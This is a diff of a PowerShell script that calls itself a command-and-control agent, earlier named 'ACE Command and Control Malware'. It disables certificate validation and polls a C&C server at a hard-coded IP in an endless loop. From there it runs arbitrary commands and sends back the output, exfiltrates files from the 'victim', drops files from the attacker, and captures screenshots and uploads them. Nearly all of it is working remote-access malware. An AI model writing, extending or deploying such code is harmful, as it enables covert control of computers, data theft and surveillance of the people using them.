@@ -1,11 +1,11 @@
-<#
-ACE Command and Control Malware
+﻿<#
+EZ Command and Control Agent
 Objective is to create a program/script that will reach out to a C&C Server to obtain commands
 This program should also be able to exfil data
 
 Current goal is to make a script that:
 A) reaches out to a C&C (either scp, ssh or directly to a webpage)
-    - Currently via webpag
+    - Currently via webpage
 B) Receive commands needed
     - Currently checks webpage for command
 C) perform commands
@@ -13,6 +13,7 @@ C) perform commands
 D) send results back to C&C server (part 1 of exfil)
     - Sends results back by base64 encode and post request to webpage
 E) send files back to C&C server (csv, txt, or w/e)
+F) takes screenshots and sends back to the attacker
 
 
 ######
@@ -24,6 +25,15 @@ v0.2
     - Modified Run Command to use "DownloadString" for "GET" instead of Invoke Web Request
     - Mofified Upload (victim to attacker) to use "UploadString" for POST request
     - Modified Screenshot to use UploadString for PUT request
+
+v0.3
+    - Updated server for /ServerRequirements/ Directory for portability
+
+v0.3.1
+    - TODO: Add an enumeration script
+	- Pull down the script from CNC server, run the script, save output and send output back to CNC server
+	- TODO: Maybe make it run the script in memory? Or download script, run and then delete?
+
 #>
 
 
@@ -31,6 +41,7 @@ v0.2
 while ($true)
 { $i++
 
+# Needed for Certificate issues
 Add-Type @"
     using System;
     using System.Net;
@@ -53,17 +64,19 @@ Add-Type @"
 
 
 # Connect to C&C, check to see if command is available (make sure it is not the same command as before)
+
+# Establishing variables pre requisite stuff
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-#ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls13;
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$ccserver = "192.168.9.4:8080" # IP of C&C server
-#$ccserver = "10.197.27.89:4443" # IP of C&C Server
+# IP OF C&C Server
+$ccserver = "192.168.9.4:8000" # IP of C&C server
 $web = New-Object System.Net.WebClient
 $Path = $env:UserProfile + "\AppData\Local\Temp\" # Path of Temp in UserProfile
 $commandPath = $Path + "command.txt" # Command.txt of Path of temp
 
 
 # Check if Temp File exists, if not, create
+# This is a temp file we will be reading fromt
 if(Test-Path $commandPath) {
 } else {
 New-Item -Path $Path -Name "command.txt" -ItemType "file" -Value "whoami"
@@ -78,6 +91,7 @@ $Command = $web.DownloadString("https://$ccserver/ServerRequirements/cc.js")
 Write-Output $Command
 }
 Catch{
+# Debug Info
 Write-Warning $error[0].Exception.InnerException
 #Write-Warning "Server is offline"
 #Write-Output $Command
@@ -89,11 +103,21 @@ $b = $a -split ','
 $CurrentCommand = $b[1]
 $Indicator = $b[0]
 
+# Debug Stuff
 #write-host CurrentCommand is: $CurrentCommand
 #write-host Previous is: $PreviousCommand
 #write-host Indicator: $Indicator
 
+#################
 # Run Commands
+# This is the 'if/else' of everything
+# When the agent connects back to server, it'll see what the server wants it to do
+# Depending on the 'indicator' (1/2/3/4/etc), go to that and run that thing
+#################
+
+#########
+# 1 = Run a command
+#########
 if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
     write-host "Found a command, running it"
     $CurrentCommand | out-file -filepath $commandPath -NoNewLine
@@ -123,7 +147,7 @@ if($Indicator -eq '1' -And $PreviousCommand -ne $CurrentCommand) {
 } 
 
 ###############
-# File Upload - Grab file from Victim and Send to Attacker
+# 2 = File Upload - Grab file from Victim and Send to Attacker
 ###############
 elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
     write-host "Time to upload a file!"
@@ -142,7 +166,7 @@ elseif($Indicator -eq '2' -And $PreviousCommand -ne $CurrentCommand) {
 
 } 
 ###########
-## DOWNLOAD A FILE
+# 3 = DOWNLOAD A FILE from attacker and send to victim
 ###########
 elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
 #if($Indicator -eq '3') {
@@ -150,15 +174,14 @@ elseif($Indicator -eq '3' -And $PreviousCommand -ne $CurrentCommand) {
     $CurrentCommand | out-file -filepath $commandPath -NoNewLine
 
     # Perform Command and save to variable
-    $CommandOutput = $web.DownloadFile("https://$ccserver/Files/$CurrentCommand", $CurrentCommand)
+    $CommandOutput = $web.DownloadFile("https://$ccserver/ServerRequirements/$CurrentCommand", $CurrentCommand)
     
     # Necessary to wait for next instruction
     Start-Sleep -s 5
 
 } 
 ######
-# Take Screenshot
-# TODO: Figure out to stop loop of screenshot
+# 4 = Take Screenshot, base64 encode and send to attacker for parsing
 ######
 elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
     write-host "Taking screenshot..."
@@ -195,15 +218,8 @@ elseif($Indicator -eq '4' -And $PreviousCommand -ne $CurrentCommand){
     # Necessary to wait for next instruction
     Start-Sleep -s 5
 }
-######
-# Take Screenshot
-# TODO: Figure out to stop loop of screenshot
-######
-elseif($Indicator -eq '5' -And $PreviousCommand -ne $CurrentCommand){
-    write-host "Let's enumerate"
-}
 #########
-# Exit
+# ELSE = If none of the above, then the commands are duplicate (no new commands) and we take a breather)
 #########
 else {
     write-host "Duplicate commands or invalid request. Let's take a breather"
@@ -212,7 +228,7 @@ else {
 }
 
 
-# Sleep 15 seconds
+# Sleep 5 seconds
 Start-Sleep -s 5
 
-} # End infinit loop
+} # End infinite loop
